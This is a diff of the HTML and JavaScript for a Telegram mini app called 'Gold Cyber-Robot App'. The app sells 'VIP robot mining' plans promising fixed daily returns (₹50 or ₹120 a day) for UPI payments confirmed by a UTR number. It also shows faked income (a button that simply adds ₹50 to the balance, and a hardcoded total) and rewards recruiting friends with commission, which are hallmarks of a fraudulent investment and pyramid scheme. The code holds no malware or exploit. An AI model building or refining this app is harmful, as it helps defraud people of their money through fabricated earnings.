@@ -3,24 +3,25 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Robot Mining Mini App</title>
+  <title>Gold Cyber-Robot App</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root {
-      --bg-color: #0a0c10;
-      --card-bg: #141822;
-      --accent-gold: #f3ba2f;
-      --accent-cyan: #00e5ff;
+      --bg-gradient: radial-gradient(circle at top, #2c2006 0%, #0d0a03 60%, #050401 100%);
+      --card-gold: linear-gradient(135deg, #1f190a 0%, #120e05 100%);
+      --gold-accent: #f3ba2f;
+      --gold-glow: #ffd700;
+      --gold-btn: linear-gradient(90deg, #f3ba2f, #ff9f43);
       --text-main: #ffffff;
-      --text-sub: #82889a;
+      --text-sub: #a39572;
+      --border-gold: rgba(243, 186, 47, 0.3);
     }
 
-    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
+    * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
 
     body {
-      background-color: var(--bg-color);
+      background: var(--bg-gradient);
       color: var(--text-main);
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
       display: flex;
       flex-direction: column;
       height: 100vh;
@@ -28,249 +29,258 @@
       position: relative;
     }
 
-    /* AUTH OVERLAY (SIGNUP / LOGIN) */
-    .auth-overlay {
-      position: absolute;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(10, 12, 16, 0.98);
-      z-index: 999;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
-    }
-
-    /* BACKGROUND ROBOT ANIMATION */
-    .bg-robot {
-      position: absolute;
-      top: 20%;
-      left: 50%;
+    /* DYNAMIC BACKGROUND ANIMATED ROBOT */
+    .bg-robot-container {
+      position: absolute; top: 25%; left: 50%;
       transform: translate(-50%, -50%);
-      font-size: 110px;
-      opacity: 0.12;
-      animation: floatRobot 3s ease-in-out infinite alternate;
-      pointer-events: none;
-      z-index: 1;
+      pointer-events: none; z-index: 1; text-align: center;
+    }
+    .bg-robot {
+      font-size: 130px; opacity: 0.12;
+      filter: drop-shadow(0 0 25px var(--gold-accent));
+      animation: floatRobot 3.5s ease-in-out infinite alternate;
     }
     @keyframes floatRobot {
-      0% { transform: translate(-50%, -40%) scale(1); }
-      100% { transform: translate(-50%, -60%) scale(1.1); }
+      0% { transform: translateY(-10px) scale(0.95) rotate(-3deg); opacity: 0.10; }
+      100% { transform: translateY(15px) scale(1.05) rotate(3deg); opacity: 0.22; }
     }
 
-    /* HEADER */
-    .header {
-      padding: 15px;
-      text-align: center;
-      z-index: 2;
-      background: radial-gradient(circle at top, rgba(0, 229, 255, 0.1), transparent);
-    }
-    .balance-amount {
-      font-size: 36px;
-      font-weight: 900;
-      color: var(--accent-gold);
-      text-shadow: 0 0 15px rgba(243, 186, 47, 0.4);
+    /* AUTH OVERLAY */
+    .auth-overlay {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(5, 4, 1, 0.98); z-index: 999;
+      display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px;
     }
 
-    /* CONTENT & PAGES */
-    .content {
-      flex: 1;
-      overflow-y: auto;
-      padding: 15px;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      z-index: 2;
-    }
-    .page { display: none; width: 100%; flex-direction: column; align-items: center; }
+    /* MAIN CONTAINER & PAGES */
+    .content { flex: 1; overflow-y: auto; padding: 16px; padding-bottom: 95px; z-index: 2; }
+    .page { display: none; width: 100%; flex-direction: column; }
     .page.active { display: flex; }
 
-    /* CARDS & UI */
-    .card {
-      width: 100%;
-      background: var(--card-bg);
-      border: 1px solid rgba(0, 229, 255, 0.2);
-      border-radius: 16px;
-      padding: 16px;
-      margin-bottom: 12px;
-      box-shadow: 0 4px 20px rgba(0,0,0,0.6);
+    /* FLOATING GOLDEN NAVBAR */
+    .navbar {
+      position: fixed; bottom: 15px; left: 4%; width: 92%;
+      background: rgba(25, 20, 8, 0.9); backdrop-filter: blur(15px);
+      border: 1px solid var(--border-gold); border-radius: 30px;
+      display: flex; justify-content: space-around; padding: 12px 0;
+      z-index: 100; box-shadow: 0 10px 30px rgba(0,0,0,0.8);
+    }
+    .nav-item { display: flex; flex-direction: column; align-items: center; color: var(--text-sub); font-size: 11px; cursor: pointer; }
+    .nav-item.active { color: var(--gold-accent); font-weight: bold; text-shadow: 0 0 10px var(--gold-accent); }
+    .nav-icon { font-size: 18px; margin-bottom: 2px; }
+
+    /* BUTTONS & CARDS */
+    .btn-gold {
+      background: var(--gold-btn); color: #000; border: none;
+      padding: 12px 20px; border-radius: 20px; font-weight: bold; cursor: pointer;
+      box-shadow: 0 4px 15px rgba(243, 186, 47, 0.3); transition: transform 0.1s;
+    }
+    .btn-gold:active { transform: scale(0.96); }
+
+    .gold-card {
+      background: var(--card-gold); border: 1px solid var(--border-gold);
+      border-radius: 24px; padding: 18px; margin-bottom: 15px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.6); position: relative;
     }
 
-    /* ROBOT MINER COIN */
-    .tap-area { margin: 20px 0; position: relative; }
-    .main-coin {
-      width: 200px;
-      height: 200px;
-      border-radius: 50%;
-      background: radial-gradient(circle, #00e5ff 0%, #005c8a 100%);
-      box-shadow: 0 0 35px rgba(0, 229, 255, 0.5);
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      cursor: pointer;
-      transition: transform 0.05s;
+    /* HOME SCREEN */
+    .hero-text { font-size: 24px; font-weight: bold; margin: 15px 0 25px 5px; color: var(--gold-accent); line-height: 1.3; }
+    .action-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 20px; }
+    .action-card {
+      border-radius: 24px; padding: 20px 15px; display: flex; flex-direction: column;
+      justify-content: space-between; height: 110px; font-size: 16px; font-weight: 600;
+      border: 1px solid var(--border-gold);
     }
-    .main-coin:active { transform: scale(0.92); }
-    .coin-inner { font-size: 80px; }
+
+    /* INPUT & MENU ITEMS */
+    .input-box {
+      width: 100%; padding: 12px; margin: 8px 0; border-radius: 12px;
+      border: 1px solid var(--border-gold); background: #080602; color: #fff;
+      text-align: center; outline: none;
+    }
+    .menu-item { display: flex; justify-content: space-between; padding: 14px 0; border-bottom: 1px solid rgba(243, 186, 47, 0.1); font-size: 14px; }
 
     /* PAYMENT MODAL */
     .modal {
-      display: none;
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.85);
-      z-index: 100;
-      justify-content: center;
-      align-items: center;
-      padding: 20px;
+      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.9); z-index: 200; justify-content: center; align-items: center; padding: 20px;
     }
-
-    /* INPUTS & BUTTONS */
-    .input-field {
-      width: 100%; padding: 12px; margin-top: 8px;
-      border-radius: 8px; border: 1px solid #252c3d;
-      background: #0a0c10; color: #fff; text-align: center;
-    }
-    .btn-action {
-      width: 100%; padding: 12px; margin-top: 10px;
-      border-radius: 8px; border: none;
-      background: linear-gradient(90deg, #00e5ff, #0077ff);
-      color: #000; font-weight: bold; cursor: pointer;
-    }
-
-    /* NAVBAR */
-    .navbar {
-      width: 100%; background: #0e1118; display: flex;
-      justify-content: space-around; padding: 10px 0 15px;
-      border-top: 1px solid #1a202c; z-index: 10;
-    }
-    .nav-item {
-      display: flex; flex-direction: column; align-items: center;
-      color: var(--text-sub); font-size: 10px; cursor: pointer;
-    }
-    .nav-item.active { color: var(--accent-cyan); }
   </style>
 </head>
 <body>
 
-  <!-- BACKGROUND TOY/ROBOT ANIMATION -->
-  <div class="bg-robot">🤖</div>
+  <!-- BACKGROUND ANIMATED ROBOT -->
+  <div class="bg-robot-container">
+    <div class="bg-robot">🤖</div>
+  </div>
 
-  <!-- AUTH SCREEN (SIGNUP / LOGIN) -->
+  <!-- AUTH SCREEN -->
   <div class="auth-overlay" id="authOverlay">
-    <div class="card" style="text-align:center;">
-      <h2 style="color:var(--accent-cyan); margin-bottom:10px;">🤖 Robot Miner Login</h2>
-      <input type="text" class="input-field" placeholder="Enter Username">
-      <input type="password" class="input-field" placeholder="Enter Password">
-      <button class="btn-action" onclick="handleAuth()">Login / Sign Up</button>
+    <div class="gold-card" style="width: 90%; text-align: center;">
+      <h2 style="color:var(--gold-accent); margin-bottom:10px;">🤖 Gold Robot Login</h2>
+      <input type="text" class="input-box" placeholder="Username / Phone">
+      <input type="password" class="input-box" placeholder="Password">
+      <button class="btn-gold" style="width: 100%; margin-top: 10px;" onclick="handleAuth()">Login / Sign Up</button>
     </div>
   </div>
 
-  <!-- MAIN HEADER -->
-  <div class="header">
-    <div style="font-size:11px; color:var(--text-sub);">ROBOT MINING BALANCE</div>
-    <div class="balance-amount">₹<span id="balance">0.00</span></div>
-  </div>
-
-  <!-- MAIN CONTENT -->
+  <!-- CONTENT PAGES -->
   <div class="content">
 
-    <!-- PAGE 1: MINING -->
-    <div id="page-mining" class="page active">
-      <div class="card" style="text-align:center;" id="lockCard">
-        <h3 style="color:var(--accent-gold);">🔒 Mining Status: LOCKED</h3>
-        <p style="font-size:12px; color:var(--text-sub);">Buy VIP Plan to start 24/7 Robot Mining!</p>
+    <!-- 1. HOME PAGE -->
+    <div id="page-home" class="page active">
+      <div class="hero-text">
+        Hey Surajsharma<br>
+        <span style="font-weight: 300; color: #fff; font-size: 18px;">Let's see what can I do for you?</span>
       </div>
 
-      <div class="tap-area">
-        <div class="main-coin" onclick="tapCoin()">
-          <div class="coin-inner">🤖</div>
+      <div class="action-grid">
+        <div class="action-card" style="background: rgba(255,255,255,0.05);" onclick="switchPage('page-mine', document.querySelectorAll('.nav-item')[4])">
+          <span>Withdrawal</span>
+          <span style="text-align: right; color: var(--gold-accent); font-size: 20px;">↗</span>
+        </div>
+        <div class="action-card" style="background: var(--card-gold);" onclick="openPayment('Recharge', 500)">
+          <span style="color: var(--gold-accent);">Recharge</span>
+          <span style="text-align: right; color: var(--gold-accent); font-size: 20px;">↙</span>
+        </div>
+      </div>
+
+      <p style="font-size: 12px; color: var(--text-sub); margin-bottom: 8px;">Hot News</p>
+      <div class="gold-card" style="padding: 12px 18px; display: flex; align-items: center; gap: 10px; font-size: 12px;">
+        <span>📰</span>
+        <span style="flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: var(--text-sub);">The leader in industrial robotics tops the shipment rankings...</span>
+        <span style="color: var(--gold-accent);">→</span>
+      </div>
+    </div>
+
+    <!-- 2. DEVICE (VIP PLANS) PAGE -->
+    <div id="page-device" class="page">
+      <h3 style="text-align: center; margin-bottom: 15px; color: var(--gold-accent);">VIP Robot Market</h3>
+
+      <div class="gold-card">
+        <div style="text-align: center; font-size: 60px; margin-bottom: 5px;">🤖</div>
+        <h3 style="color: var(--gold-accent);">VIP 1 (Nobi10)</h3>
+        <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-top: 10px;">
+          <div style="font-size: 12px; color: var(--text-sub); line-height: 1.8;">
+            Price: <strong style="color: #fff;">₹2,000</strong><br>
+            Rank Code: <strong style="color: var(--gold-accent);">Nobi10</strong><br>
+            Daily revenue: <strong style="color: #00ff66;">₹50 / day</strong>
+          </div>
+          <button class="btn-gold" onclick="openPayment('VIP 1 (Nobi10)', 2000)">BUY VIP 1</button>
+        </div>
+      </div>
+
+      <div class="gold-card">
+        <div style="text-align: center; font-size: 60px; margin-bottom: 5px;">🦾</div>
+        <h3 style="color: var(--gold-accent);">VIP 2 (Nobi50)</h3>
+        <div style="display: flex; justify-content: space-between; align-items: flex-end; margin-top: 10px;">
+          <div style="font-size: 12px; color: var(--text-sub); line-height: 1.8;">
+            Price: <strong style="color: #fff;">₹5,000</strong><br>
+            Rank Code: <strong style="color: var(--gold-accent);">Nobi50</strong><br>
+            Daily revenue: <strong style="color: #00ff66;">₹120 / day</strong>
+          </div>
+          <button class="btn-gold" onclick="openPayment('VIP 2 (Nobi50)', 5000)">BUY VIP 2</button>
         </div>
       </div>
     </div>
 
-    <!-- PAGE 2: VIP PLANS -->
-    <div id="page-vip" class="page">
-      <div class="card">
-        <h3>VIP 1 PLAN - ₹2,000</h3>
-        <p>Daily Profit: ₹50/day | 1 Year Validity</p>
-        <button class="btn-action" onclick="openPayment('VIP 1', 2000)">Buy VIP 1</button>
+    <!-- 3. ENERGY (MINING) PAGE -->
+    <div id="page-energy" class="page">
+      <div class="gold-card" style="text-align: center;">
+        <h3 style="color: var(--gold-accent);">Mining Terminal</h3>
+        <p style="font-size: 12px; color: var(--text-sub); margin-top: 4px;">Tap & Collect Mining Revenue</p>
       </div>
 
-      <div class="card">
-        <h3>VIP 2 PLAN - ₹5,000</h3>
-        <p>Daily Profit: ₹120/day | 1 Year Validity</p>
-        <button class="btn-action" onclick="openPayment('VIP 2', 5000)">Buy VIP 2</button>
+      <div style="width: 220px; height: 220px; border-radius: 50%; border: 2px dashed var(--gold-accent); margin: 20px auto; display: flex; justify-content: center; align-items: center; background: rgba(243, 186, 47, 0.05);" onclick="startMining()">
+        <div style="font-size: 90px; filter: drop-shadow(0 0 20px var(--gold-accent)); cursor: pointer;">🤖</div>
+      </div>
+
+      <div style="display: flex; gap: 10px; margin-top: 10px;">
+        <button class="btn-gold" style="flex: 1;" onclick="startMining()">⏻ Start Miner</button>
+        <button class="btn-gold" style="flex: 1; background: #333; color: #fff;" onclick="claimIncome()">Receive Revenue</button>
       </div>
     </div>
 
-    <!-- PAGE 3: PROFILE & EXTRA OPTIONS -->
-    <div id="page-profile" class="page">
-      <div class="card">
-        <h3>👤 Profile & Account</h3>
-        <p>Status: <strong style="color:var(--accent-cyan);" id="userVIP">Free Member</strong></p>
+    <!-- 4. INVITE PAGE -->
+    <div id="page-invite" class="page">
+      <div class="gold-card" style="text-align: center;">
+        <div style="font-size: 60px; margin-bottom: 10px;">🤖👋</div>
+        <h3 style="color: var(--gold-accent); margin-bottom: 10px;">Invite Friends</h3>
+        
+        <div style="background: #000; border: 1px solid var(--border-gold); padding: 15px; border-radius: 16px; display: inline-block; margin-bottom: 15px;">
+          <div style="width: 130px; height: 130px; border: 2px solid var(--gold-accent); margin: 0 auto; display: flex; align-items: center; justify-content: center; font-size: 10px; color: var(--gold-accent);">
+            [ QR CODE ]
+          </div>
+        </div>
+
+        <p style="font-size: 11px; color: var(--text-sub); text-align: left;">
+          Invite team members to upgrade your level and earn additional passive commission!
+        </p>
+        <button class="btn-gold" style="width: 100%; margin-top: 15px;" onclick="copyLink()">Copy Invite Link</button>
+      </div>
+    </div>
+
+    <!-- 5. MINE (PROFILE) PAGE -->
+    <div id="page-mine" class="page">
+      <div class="gold-card">
+        <div style="display: flex; justify-content: space-between; align-items: center;">
+          <div>
+            <span style="background: var(--gold-btn); color: #000; padding: 2px 10px; border-radius: 10px; font-size: 11px; font-weight: bold;" id="vipStatusBadge">Nobi10</span>
+            <h2 style="margin-top: 6px; color: #fff;">Surajsharma</h2>
+            <p style="font-size: 11px; color: var(--text-sub);">(****53601)</p>
+          </div>
+          <div style="font-size: 45px;">👤</div>
+        </div>
       </div>
 
-      <div class="card">
-        <h3>🔑 Reception Code</h3>
-        <input type="text" class="input-field" placeholder="Enter Reception Code">
-        <button class="btn-action" onclick="alert('Code Redeemed!')">Redeem</button>
+      <div style="display: flex; justify-content: space-around; background: var(--card-gold); border: 1px solid var(--border-gold); padding: 15px; border-radius: 20px; margin-bottom: 15px; text-align: center;">
+        <div><p style="font-size: 10px; color: var(--text-sub);">Earnings of the day</p><h3 style="color:var(--gold-accent);">₹0.00</h3></div>
+        <div><p style="font-size: 10px; color: var(--text-sub);">Available amount</p><h3 style="color:#00ff66;" id="userBal">₹0.00</h3></div>
+        <div><p style="font-size: 10px; color: var(--text-sub);">Total income</p><h3 style="color:var(--gold-accent);">₹453.80</h3></div>
       </div>
 
-      <div class="card">
-        <h3>📊 Withdrawal Status</h3>
-        <p style="font-size:12px; color:var(--text-sub);">Last Status: <strong style="color:var(--accent-gold);">No Requests</strong></p>
+      <div class="gold-card">
+        <div class="menu-item" onclick="openRedeem()"><span>👥 Redemption code</span><span style="color:var(--gold-accent);">→</span></div>
+        <div class="menu-item"><span>📊 Revenue Details</span><span style="color: var(--gold-accent);">453.808 →</span></div>
+        <div class="menu-item"><span>⚙️ Set up</span><span style="color:var(--gold-accent);">→</span></div>
+        <div class="menu-item"><span>💳 Wallet Address</span><span style="color:var(--gold-accent);">→</span></div>
+        <div class="menu-item" onclick="handleLogout()" style="color: #ff4757;"><span>🚪 Log out</span><span>→</span></div>
       </div>
-
-      <button class="btn-action" style="background:#ff3366; color:#fff;" onclick="handleLogout()">Logout</button>
     </div>
 
   </div>
 
-  <!-- VIP PAYMENT MODAL POPUP -->
+  <!-- PAYMENT MODAL -->
   <div class="modal" id="paymentModal">
-    <div class="card" style="text-align:center;">
-      <h3 id="modalTitle">Pay for VIP</h3>
-      <p style="font-size:12px; color:var(--text-sub); margin-top:5px;">Pay via UPI & Submit 12-Digit UTR:</p>
-      
-      <!-- PASTE YOUR UPI ID HERE -->
-      <div style="background:#0a0c10; padding:10px; border:1px dashed var(--accent-cyan); color:var(--accent-cyan); margin:10px 0; border-radius:8px;">
+    <div class="gold-card" style="width: 90%; text-align: center;">
+      <h3 id="modalTitle" style="color: var(--gold-accent);">VIP Payment</h3>
+      <p style="font-size: 12px; color: var(--text-sub); margin-top: 4px;">Scan UPI QR or copy UPI ID & pay:</p>
+
+      <div style="background: #000; border: 1px dashed var(--gold-accent); padding: 10px; border-radius: 10px; margin: 12px 0; color: var(--gold-accent); font-weight: bold; font-size: 13px;">
         YOUR_UPI_ID_HERE
       </div>
 
-      <input type="text" class="input-field" id="utrInput" placeholder="Enter 12-Digit UTR">
-      <button class="btn-action" onclick="submitUTR()">Submit Payment UTR</button>
-      <button class="btn-action" style="background:#333; color:#fff; margin-top:5px;" onclick="closeModal()">Close</button>
+      <input type="text" class="input-box" id="utrInput" placeholder="Enter 12-Digit UTR / Ref No">
+      <button class="btn-gold" style="width: 100%; margin-top: 8px;" onclick="submitUTR()">Submit Payment UTR</button>
+      <button class="btn-gold" style="width: 100%; background: #333; color: #fff; margin-top: 6px;" onclick="closeModal()">Close</button>
     </div>
   </div>
 
   <!-- BOTTOM NAVBAR -->
   <div class="navbar">
-    <div class="nav-item active" onclick="switchPage('page-mining', this)">
-      <div>⛏️</div>
-      <div>Mining</div>
-    </div>
-    <div class="nav-item" onclick="switchPage('page-vip', this)">
-      <div>👑</div>
-      <div>VIP Plans</div>
-    </div>
-    <div class="nav-item" onclick="switchPage('page-profile', this)">
-      <div>👤</div>
-      <div>Profile</div>
-    </div>
+    <div class="nav-item active" onclick="switchPage('page-home', this)"><div class="nav-icon">🏠</div>Home</div>
+    <div class="nav-item" onclick="switchPage('page-device', this)"><div class="nav-icon">🤖</div>Device</div>
+    <div class="nav-item" onclick="switchPage('page-energy', this)"><div class="nav-icon">⚡</div>Energy</div>
+    <div class="nav-item" onclick="switchPage('page-invite', this)"><div class="nav-icon">📄</div>Invite</div>
+    <div class="nav-item" onclick="switchPage('page-mine', this)"><div class="nav-icon">👤</div>Mine</div>
   </div>
 
   <script>
-    let isPaid = false;
-    let userBalance = 0.00;
+    let currentVIP = "Nobi10";
+    let balance = 0.00;
 
-    function handleAuth() {
-      document.getElementById('authOverlay').style.display = 'none';
-    }
-
-    function handleLogout() {
-      document.getElementById('authOverlay').style.display = 'flex';
-    }
+    function handleAuth() { document.getElementById('authOverlay').style.display = 'none'; }
+    function handleLogout() { document.getElementById('authOverlay').style.display = 'flex'; }
 
     function switchPage(pageId, element) {
       document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
@@ -282,27 +292,36 @@
     function openPayment(planName, price) {
       document.getElementById('modalTitle').innerText = `Pay for ${planName} (₹${price})`;
       document.getElementById('paymentModal').style.display = 'flex';
+      
+      if(planName.includes("VIP 1")) currentVIP = "Nobi10";
+      if(planName.includes("VIP 2")) currentVIP = "Nobi50";
     }
 
-    function closeModal() {
-      document.getElementById('paymentModal').style.display = 'none';
-    }
+    function closeModal() { document.getElementById('paymentModal').style.display = 'none'; }
 
     function submitUTR() {
-      const utr = document.getElementById('utrInput').value;
-      if(utr.length < 10) { alert('Enter valid UTR'); return; }
-      alert('UTR Submitted! Verification Pending.');
+      let utr = document.getElementById('utrInput').value;
+      if(utr.length < 10) { alert("Please enter a valid 12-digit UTR!"); return; }
+      alert("UTR Submitted! Account updated to " + currentVIP + " after verification.");
+      document.getElementById('vipStatusBadge').innerText = currentVIP;
       closeModal();
     }
 
-    function tapCoin() {
-      if(!isPaid) {
-        alert("🔒 Buy VIP Plan to start mining!");
-        switchPage('page-vip', document.querySelectorAll('.nav-item')[1]);
-        return;
-      }
-      userBalance += 1;
-      document.getElementById('balance').innerText = userBalance.toFixed(2);
+    function startMining() { alert("Mining Engine active for VIP: " + currentVIP); }
+    function claimIncome() {
+      balance += 50.00;
+      document.getElementById('userBal').innerText = "₹" + balance.toFixed(2);
+      alert("Revenue Collected!");
+    }
+
+    function openRedeem() {
+      let code = prompt("Enter Secret Redemption Code:");
+      if(code) alert("Redemption Request Sent!");
+    }
+
+    function copyLink() {
+      navigator.clipboard.writeText("https://t.me/YourGoldBot");
+      alert("Invite Link Copied!");
     }
   </script>
 </body>
